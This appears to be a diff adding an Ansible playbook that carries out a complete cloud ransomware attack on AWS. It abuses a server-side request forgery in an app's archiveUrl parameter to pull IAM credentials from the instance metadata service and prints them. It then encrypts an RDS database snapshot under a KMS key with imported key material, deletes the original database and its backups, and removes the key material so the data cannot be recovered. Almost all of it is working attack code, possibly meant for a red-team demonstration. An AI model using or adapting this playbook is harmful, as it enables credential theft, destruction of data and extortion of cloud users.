@@ -1,0 +1,101 @@
+- hosts: all
+  gather_facts: false
+  tasks:
+  - name: set name suffix
+    set_fact:
+      random_number: "{{ 100 | random }}"
+  - name: get role name
+    ansible.builtin.uri:
+      url: "{{ app_url }}/api/archives?archiveUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      return_content: true
+    register: role_name
+  - name: get creds
+    ansible.builtin.uri:
+      url: "{{ app_url }}/api/archives?archiveUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/{{ role_name['content'] }}"
+      return_content: true
+    register: creds
+  - name: Print creds
+    ansible.builtin.debug:
+      msg: "{{ creds['content'] | from_json }}"
+  - name: install pip
+    become: true
+    apt:
+      name: python3-pip
+      state: present
+  - name: Install AWS CLI for aws cli user
+    become: true
+    pip:
+      name: awscli
+      state: latest
+
+  - name: create new kms cmk
+    shell: "aws kms create-key --origin EXTERNAL"
+    register: cmk_details
+    environment: &awsenv
+      AWS_REGION: "{{ aws_region }}"
+      AWS_DEFAULT_REGION: "{{ aws_region }}"
+      AWS_ACCESS_KEY_ID: "{{ (creds['content'] | from_json).AccessKeyId }}"
+      AWS_SECRET_ACCESS_KEY: "{{ (creds['content'] | from_json).SecretAccessKey }}"
+      AWS_SESSION_TOKEN: "{{ (creds['content'] | from_json).Token }}"
+
+  - name: get cmk import params
+    register: cmk_import_details
+    environment: *awsenv
+    shell: "aws kms get-parameters-for-import --key-id {{ (cmk_details.stdout | from_json).KeyMetadata.KeyId }} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text"
+
+  - name: setup cmk
+    environment: *awsenv
+    shell: |
+      openssl rand -out PlaintextKeyMaterial.bin 32
+      echo "{{ cmk_import_details.stdout }}" | awk '{print $1}' > PublicKey.b64
+      echo "{{ cmk_import_details.stdout }}" | awk '{print $2}' > ImportToken.b64
+      openssl enc -d -base64 -A -in PublicKey.b64 -out PublicKey.bin
+      openssl enc -d -base64 -A -in ImportToken.b64 -out ImportToken.bin
+      openssl pkeyutl -in PlaintextKeyMaterial.bin -out EncryptedKeyMaterial.bin -inkey PublicKey.bin -keyform DER -pubin -encrypt -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
+      aws kms import-key-material --key-id "{{ (cmk_details.stdout | from_json).KeyMetadata.KeyId }}" --encrypted-key-material fileb://EncryptedKeyMaterial.bin --import-token fileb://ImportToken.bin --expiration-model KEY_MATERIAL_EXPIRES --valid-to $(date -d "+ 7 days" "+%s")
+
+  - name: get db listing
+    shell: "aws rds describe-db-instances"
+    environment: *awsenv
+
+  - name: describe db
+    shell: "aws rds describe-db-instances --db-instance-identifier {{ database_name }}"
+    environment: *awsenv
+
+  - name: create db snapshot
+    shell: "aws rds create-db-snapshot --db-snapshot-identifier pwnd-source-{{ random_number }} --db-instance-identifier {{ database_name }}"
+    environment: *awsenv
+
+  - name: validate db snapshot create is done
+    shell: |
+      aws rds describe-db-snapshots --query "*[?DBSnapshotIdentifier=='pwnd-source-{{ random_number }}'] | [].Status | [0]" --output text
+    register: snapshot_status
+    until: snapshot_status.stdout == "available"
+    retries: 10
+    delay: 20
+    environment: *awsenv
+
+  - name: copy db snapshot to new snapshot with cmk
+    shell: "aws rds copy-db-snapshot --source-db-snapshot-identifier pwnd-source-{{ random_number }} --target-db-snapshot-identifier pwnd-{{ random_number }} --kms-key-id {{ (cmk_details.stdout | from_json).KeyMetadata.KeyId }}"
+    environment: *awsenv
+ 
+  - name: validate db copy snapshot create is done
+    shell: |
+      aws rds describe-db-snapshots --query "*[?DBSnapshotIdentifier=='pwnd-{{ random_number }}'] | [].Status | [0]" --output text
+    register: snapshot_status
+    until: snapshot_status.stdout == "available"
+    retries: 10
+    delay: 20
+    environment: *awsenv
+
+  - name: remove unencrypted db snapshot
+    shell: "aws rds delete-db-snapshot --db-snapshot-identifier pwnd-source-{{ random_number }}"
+    environment: *awsenv
+
+  - name: remove db instance
+    shell: "aws rds delete-db-instance --db-instance-identifier {{ database_name }} --skip-final-snapshot --delete-automated-backups"
+    environment: *awsenv
+
+  - name: remove cmk material
+    shell: "aws kms delete-imported-key-material --key-id {{ (cmk_details.stdout | from_json).KeyMetadata.KeyId }}"
+    environment: *awsenv
